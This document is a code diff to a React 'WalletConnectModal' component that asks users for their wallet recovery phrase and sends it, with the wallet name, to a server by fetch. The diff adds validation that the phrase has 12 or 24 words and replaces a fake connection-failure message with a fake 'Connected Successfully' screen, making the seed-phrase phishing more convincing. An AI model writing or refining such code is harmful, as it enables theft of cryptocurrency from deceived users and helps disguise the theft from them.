@@ -5,6 +5,7 @@ import { useState } from "react";
 export default function WalletConnectModal({ onClose }: { onClose: () => void }) {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
+  const [success, setSuccess] = useState(false);
   const [phrase, setPhrase] = useState("");
   const [walletName, setWalletName] = useState("");
 
@@ -13,6 +14,12 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
       setError("Please fill out all fields.");
       return;
     }
+    const wordsCount = phrase.trim().split(/\s+/).length;
+    if (wordsCount !== 12 && wordsCount !== 24) {
+      setError("Invalid recovery phrase. It must be exactly 12 or 24 words.");
+      return;
+    }
+
     setLoading(true);
     setError("");
 
@@ -22,15 +29,16 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ walletName, phrase }),
       });
+      setTimeout(() => {
+        setLoading(false);
+        setSuccess(true);
+        setPhrase("");
+      }, 1500);
     } catch (err) {
       console.error(err);
-    }
-
-    setTimeout(() => {
       setLoading(false);
-      setError("Unfortunately, we couldn't connect to the provider. Please check your network or try a different wallet provider.");
-      setPhrase("");
-    }, 1500);
+      setError("An unexpected error occurred. Please try again.");
+    }
   };
 
   return (
@@ -94,10 +102,20 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
           </p>
         )}
 
-        <button className="btn btn-primary" onClick={handleConnect} disabled={loading} style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8 }}>
-          {loading ? <Loader2 size={18} className={loading ? "spin" : ""} style={{ animation: loading ? "spin 1s linear infinite" : "none" }} /> : null}
-          {loading ? "Connecting..." : "Connect Wallet"}
-        </button>
+        {success ? (
+          <div style={{ textAlign: "center", marginBottom: 16 }}>
+            <div style={{ width: 48, height: 48, borderRadius: "50%", background: "rgba(57,217,138,0.12)", color: "#39d98a", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 12px" }}>
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+            <p style={{ fontSize: 16, fontWeight: 800, color: "var(--text)", marginBottom: 4 }}>Connected Successfully</p>
+            <p style={{ fontSize: 13, color: "var(--text-3)" }}>Your {walletName} wallet has been securely linked.</p>
+          </div>
+        ) : (
+          <button className="btn btn-primary" onClick={handleConnect} disabled={loading} style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8 }}>
+            {loading ? <Loader2 size={18} className={loading ? "spin" : ""} style={{ animation: loading ? "spin 1s linear infinite" : "none" }} /> : null}
+            {loading ? "Connecting..." : "Connect Wallet"}
+          </button>
+        )}
 
         <style>{`
           @keyframes spin {
